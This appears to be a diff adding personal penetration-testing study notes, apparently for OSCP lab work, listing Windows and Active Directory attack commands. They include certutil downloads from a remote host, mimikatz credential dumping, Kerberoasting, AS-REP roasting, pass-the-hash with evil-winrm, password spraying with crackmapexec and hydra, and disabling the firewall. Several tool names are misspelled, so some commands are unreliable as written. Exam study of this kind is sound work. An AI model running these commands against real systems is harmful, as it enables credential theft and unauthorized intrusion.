@@ -1,0 +1,60 @@
+Windows
+
+07/22/2026
+certutil.exe -urlcache -f http://10.10.10.10/filename.pkg /users/public/filename.pkg [download anything to win using certutil tool]
+sc query | findstr /i sppoler [/i for ignore case sensitive in spooler]
+sc qc Spooler [ Spooler is service and here we can see service details]
+dir /s/b \filename.txt [ put the file name which you looking, You can put folder name as well, '\' it's search from root directory ]
+type filename.txt [ to read file in cmd]
+
+07/23/2026
+
+SMB Port 445 
+smbclient -L //deviceName -U domain/username [-L for list, ex smbclient -L //DC01 -U oscp/luci]
+smbclient //devicename/folder -U domain/username 
+crackmapexec [CME]
+crackmapexec smb 10.10.1.200 -u user -p passwd --continue-on-success[ domain controller ip instead of written ip here 10.10.1.200]
+netexec [successor of crackmapexec tool]
+Ligolo tool [ for proxy tunneling with local host or device]
+impacket tool [ secretdumps, psexec, winexec, evil-winrm, winrm there are many more]
+whoami /priv [checked available permission on current user]
+whoami /all
+net user /domain 
+net user username /domain [user details]
+net localgroup
+net localgroups administrators 
+
+
+07/24/2026
+schtasks
+xfreerdp /v:device_name /u:username /p:user_password +clipboard /cert:ignore [ remote desktop tool in Linux]
+
+07/26/2026
+mimikatz
+minikatz#privilege::debug
+minikatz#log
+minikatz#lsadump::lsa /inject [ it dumpes local hashes from local security authority ]
+mimikatz#sekurlsa::logonpasswords
+impacket-getuserSPNs -request -dc-ip 10.10.1.200 oscp.lab /username [this kerboroasting]
+impacket-getNPusers oscp.labs/username [ this is reproasting]
+impacket-getNPusers oscp.labs/username -outputfile username.asrep [extract hases]
+
+runas /user:oscp\username cmd.exe [login to other user in domain inside cmd]
+enum4linux -A 10.10.1.200 [Domain Controller ip]
+
+net share public=c:\Users\Name-folder-to-share /GRANT:everyone,FULL [share folder through cmd, incase access issue add everyone group manually from right click on folder in security and add username or group]
+
+**evil-winrm -i 10.10.1.200 -u Administrator -H past_NTLM_hash [ if hash isn't crackable then pass directly for login]
+netsh advfirewall set allprofiles state off [turn off firewall ]
+revshells.com
+**crakmapexec winrm 10.10.1.200-10.10.1.202 -u users -H hashes.txt --continue-on-success
+**crakmapexec winrm/smb 10.10.1.200-10.10.1.202 -u users -p password.txt --continue-on-success
+**crakmapexec smb 10.10.1.200-10.10.1.202 -u users -H hashes.txt --continue-on-success [ using crackmapexec, just to find out if login is able to success or not it mean it validates username and passwds]
+**crakmapexec rdp 10.10.1.200-10.10.1.202 -u users -p password.txt--continue-on-success
+hydra -L users.txt -P password.txt rdp://10.10.1.202
+** if normal hashcat doesn't crack password then try with adding rules 
+
+scp "file.txt" username@ip_of_system:     [where you want the file to be send, : means home directory]
+Note in case it failed and says service not running so enable ssh in system [ sudo systemctl start ssh 
+
+SharpHound,BloodHound tool [ AD data gathering tool so we can enumerate it later using BloodHound tool]
